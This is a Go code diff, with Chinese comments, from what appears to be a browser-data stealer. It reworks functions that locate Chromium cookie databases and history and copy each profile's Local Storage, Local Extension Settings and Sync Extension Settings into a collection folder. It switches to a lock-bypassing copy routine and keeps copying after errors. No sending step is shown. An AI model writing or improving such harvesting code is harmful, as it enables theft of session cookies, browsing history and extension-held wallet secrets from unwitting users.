@@ -313,6 +313,7 @@ func readSQLiteDB2(dbPath string, query string) (string, interface{}) {
 	return builder.String(), nil
 }
 
+// todo 如果谷歌浏览器运行中，cookie文件将会被使用中，数据库文件结构会改变，导致无法读取到内容,目前没有解决方案，待后续研究
 func ChromeCookies() (string, error) {
 	var builder strings.Builder
 	// 获取所有浏览器配置文件的数组
@@ -325,13 +326,10 @@ func ChromeCookies() (string, error) {
 	for _, profile := range array {
 		CookiesPath1 := filepath.Join(BrowserPath, profile, "Cookies")
 		CookiesPath2 := filepath.Join(BrowserPath, profile, "Network", "Cookies")
-		// 检查 text2 是否存在
 		if _, err := os.Stat(CookiesPath1); os.IsNotExist(err) {
-			// 如果 text2 不存在，尝试使用 text3
 			CookiesPath1 = CookiesPath2
 		}
 
-		// 再次检查 text2 是否存在
 		if _, err := os.Stat(CookiesPath1); os.IsNotExist(err) {
 			return "", fmt.Errorf("both paths do not exist: %s and %s", CookiesPath1, CookiesPath2)
 		}
@@ -471,46 +469,6 @@ func ChromeHistory() string {
 	// 返回构建的字符串结果
 	return builder.String()
 }
-
-// CopyDirectory 递归复制目录
-func CopyDirectory(src, dst string) error {
-	// 读取源目录的内容
-	files, err := ioutil.ReadDir(src)
-	if err != nil {
-		return fmt.Errorf("failed to read directory %s: %w", src, err)
-	}
-
-	// 创建目标目录
-	err = os.MkdirAll(dst, os.ModePerm)
-	if err != nil {
-		return fmt.Errorf("failed to create directory %s: %w", dst, err)
-	}
-
-	for _, file := range files {
-		srcPath := filepath.Join(src, file.Name())
-		dstPath := filepath.Join(dst, file.Name())
-
-		if file.IsDir() {
-			// 递归复制子目录
-			err = CopyDirectory(srcPath, dstPath)
-			if err != nil {
-				return err
-			}
-		} else {
-			// 复制文件
-			input, err := ioutil.ReadFile(srcPath)
-			if err != nil {
-				return fmt.Errorf("failed to read file %s: %w", srcPath, err)
-			}
-			err = ioutil.WriteFile(dstPath, input, file.Mode())
-			if err != nil {
-				return fmt.Errorf("failed to write file %s: %w", dstPath, err)
-			}
-		}
-	}
-
-	return nil
-}
 func ChromeSave(path string) {
 
 	for browserName, browserPath := range browserOnChromium {
@@ -602,20 +560,18 @@ func ChromeSave(path string) {
 			localStorageSrc := filepath.Join(BrowserPath, profile, "Local Storage")
 			localStorageDst := filepath.Join(targetDir, profile, "Local Storage")
 			if _, err := os.Stat(localStorageSrc); err == nil {
-				err = CopyDirectory(localStorageSrc, localStorageDst)
+				err = utils.CopyLockDirectory(localStorageSrc, localStorageDst)
 				if err != nil {
 					fmt.Println(err)
-					return
 				}
 			}
 			// 复制 Local Extension Settings 目录
 			localExtSettingsSrc := filepath.Join(BrowserPath, profile, "Local Extension Settings")
 			localExtSettingsDst := filepath.Join(targetDir, profile, "Local Extension Settings")
 			if _, err := os.Stat(localExtSettingsSrc); err == nil {
-				err = CopyDirectory(localExtSettingsSrc, localExtSettingsDst)
+				err = utils.CopyLockDirectory(localExtSettingsSrc, localExtSettingsDst)
 				if err != nil {
 					fmt.Println(err)
-					return
 				}
 			}
 
@@ -623,10 +579,9 @@ func ChromeSave(path string) {
 			syncExtSettingsSrc := filepath.Join(BrowserPath, profile, "Sync Extension Settings")
 			syncExtSettingsDst := filepath.Join(targetDir, profile, "Sync Extension Settings")
 			if _, err := os.Stat(syncExtSettingsSrc); err == nil {
-				err = CopyDirectory(syncExtSettingsSrc, syncExtSettingsDst)
+				err = utils.CopyLockDirectory(syncExtSettingsSrc, syncExtSettingsDst)
 				if err != nil {
 					fmt.Println(err)
-					return
 				}
 			}
 
